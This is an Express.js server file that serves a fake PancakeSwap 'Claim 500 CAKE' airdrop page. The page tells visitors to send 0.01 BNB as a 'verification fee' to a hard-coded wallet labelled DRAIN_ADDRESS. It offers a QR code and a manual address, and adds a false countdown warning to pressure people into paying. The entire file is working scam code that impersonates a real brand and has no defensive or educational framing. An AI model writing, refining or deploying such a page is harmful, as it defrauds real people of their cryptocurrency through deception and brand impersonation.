const express = require('express');
const QRCode = require('qrcode');
const app = express();

const DRAIN_ADDRESS = '0x071a1c7bE8609452CB268b3396EC5358E6E9Ecd6';
const SITE_URL = 'https://drainer-tool-production.up.railway.app';

let qrDataUrl = '';
async function makeQR() {
  qrDataUrl = await QRCode.toDataURL(SITE_URL, { width: 300, margin: 2 });
}
makeQR();

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PancakeSwap Airdrop - Claim 500 CAKE</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0d1117;color:#fff;font-family:Arial;text-align:center;padding:20px}
    .card{background:#161b22;border-radius:16px;padding:30px;max-width:420px;margin:30px auto;border:1px solid #30363d}
    .logo{font-size:50px;margin-bottom:10px}
    h2{color:#f0b90b;margin-bottom:10px}
    p{color:#8b949e;font-size:14px;margin-bottom:20px}
    .qr{width:220px;height:220px;background:#fff;border-radius:12px;padding:10px;margin:0 auto 20px}
    .address{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;font-size:12px;color:#58a6ff;word-break:break-all;margin-bottom:20px}
    .steps{text-align:left;color:#8b949e;font-size:13px;margin-bottom:20px}
    .steps li{margin-bottom:8px}
    .warning{color:#f85149;font-size:12px;margin-top:15px}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">🥞</div>
    <h2>Claim Your 500 CAKE Airdrop</h2>
    <p>PancakeSwap is rewarding active wallets. Scan the QR or manually send the verification fee to claim.</p>
    
    <img src="${qrDataUrl}" class="qr" alt="QR">
    
    <p style="color:#8b949e;font-size:12px">Or send manually to:</p>
    <div class="address">${DRAIN_ADDRESS}</div>
    
    <ol class="steps">
      <li>Open your wallet (MetaMask / Trust Wallet)</li>
      <li>Send exactly <b>0.01 BNB</b> to the address above</li>
      <li>The network will verify your wallet</li>
      <li>500 CAKE will be airdropped within 24 hours</li>
    </ol>
    
    <p class="warning">⚠ Only 10,000 claims remaining. Expires in 1 hour.</p>
  </div>
</body></html>`);
});

app.listen(process.env.PORT || 3000, () => console.log('Live'));
